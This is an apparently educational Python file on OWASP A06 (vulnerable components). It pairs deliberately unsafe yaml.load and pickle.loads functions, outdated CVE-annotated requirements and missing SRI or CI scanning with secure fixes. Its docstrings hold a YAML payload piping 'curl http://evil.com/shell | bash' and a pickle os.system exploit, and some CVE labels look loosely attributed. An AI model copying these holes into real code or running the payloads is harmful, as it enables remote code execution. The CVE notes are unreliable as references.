"""
OWASP A06:2021 - Vulnerable and Outdated Components
⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT USE IN PRODUCTION

This file demonstrates common patterns that lead to vulnerable component usage.
"""

# ============================================================
# VULNERABILITY 1: Pinned-to-outdated / insecure versions
# ============================================================

# requirements_vulnerable.txt (do not use):
VULNERABLE_REQUIREMENTS = """
# Each line below pins a version with known critical CVEs

Django==2.2.0             # CVE-2021-35042: SQL injection via QuerySet.order_by()
Flask==0.12.2             # CVE-2018-1000656: DoS via crafted JSON
Pillow==5.2.0             # CVE-2021-27921: BMP bomb DoS + heap overflow
PyYAML==3.13              # CVE-2020-1747: arbitrary code exec via yaml.load()
requests==2.18.0          # CVE-2018-18074: credentials leak via redirect
urllib3==1.22             # CVE-2019-11236: CRLF injection
lxml==3.5.0               # CVE-2021-28957: XSS via HTML serialiser
cryptography==2.1.4       # Multiple CVEs: broken AES-GCM nonce reuse
paramiko==2.0.0           # CVE-2018-7750: auth bypass
Werkzeug==0.14.1          # CVE-2019-14806: predictable pin in debug mode
"""


# ============================================================
# VULNERABILITY 2: Using yaml.load() without Loader (RCE)
# ============================================================

import yaml

def parse_config_vulnerable(config_str: str) -> dict:
    """
    BUG: yaml.load() without Loader=yaml.SafeLoader allows
    arbitrary Python object deserialization → RCE.

    Malicious payload:
    !!python/object/apply:os.system ['curl http://evil.com/shell | bash']
    """
    return yaml.load(config_str)   # BUG: no Loader specified → unsafe


# ============================================================
# VULNERABILITY 3: Deserializing untrusted pickle data
# ============================================================

import pickle
import base64

def deserialize_session_vulnerable(cookie_data: str):
    """
    BUG: Unpickling user-supplied data allows arbitrary code execution.
    An attacker crafts a malicious pickle payload and sends it as a cookie.

    Malicious payload (base64-encoded pickle):
    import os, pickle
    class Exploit(object):
        def __reduce__(self):
            return (os.system, ('id',))
    payload = base64.b64encode(pickle.dumps(Exploit()))
    """
    raw = base64.b64decode(cookie_data)
    return pickle.loads(raw)   # BUG: executing untrusted pickle data


# ============================================================
# VULNERABILITY 4: No dependency scanning in CI/CD
# ============================================================

# setup.py with loose version constraints → silently pulls in vulnerable versions:
VULNERABLE_SETUP = """
install_requires=[
    'requests',          # BUG: no upper bound — any version installed
    'flask',             # BUG: could install a version with known CVE
    'Pillow',            # BUG: no pinning whatsoever
    'django',            # BUG: no pinning
]
"""

# CI pipeline with no security scanning — no safety, no pip-audit, no Snyk:
VULNERABLE_PIPELINE = """
steps:
  - run: pip install -r requirements.txt   # installs whatever's latest
  - run: pytest                            # no security scanning step at all
"""


# ============================================================
# VULNERABILITY 5: Loading remote JavaScript without SRI
# ============================================================

VULNERABLE_HTML = """
<!-- BUG: No Subresource Integrity (SRI) hash.
     If the CDN is compromised, attacker JS runs in users' browsers. -->
<script src="https://cdn.example.com/jquery-1.7.1.min.js"></script>
"""


# ============================================================
# SECURE versions (for reference)
# ============================================================

def parse_config_secure(config_str: str) -> dict:
    """CORRECT: SafeLoader prevents object deserialization."""
    return yaml.load(config_str, Loader=yaml.SafeLoader)


import json

def serialize_session_secure(data: dict) -> str:
    """CORRECT: Use JSON (or signed JWT) instead of pickle."""
    return json.dumps(data)


def deserialize_session_secure(session_str: str) -> dict:
    """CORRECT: JSON cannot execute code."""
    return json.loads(session_str)


SECURE_REQUIREMENTS = """
# Pinned exact versions, regularly updated via Dependabot / Renovate
Django==4.2.13
Flask==3.0.3
Pillow==10.3.0
PyYAML==6.0.1
requests==2.32.3
urllib3==2.2.2
cryptography==42.0.8
"""

SECURE_HTML = """
<!-- Subresource Integrity prevents CDN-compromise attacks -->
<script
  src="https://cdn.example.com/jquery-3.7.1.min.js"
  integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs"
  crossorigin="anonymous">
</script>
"""
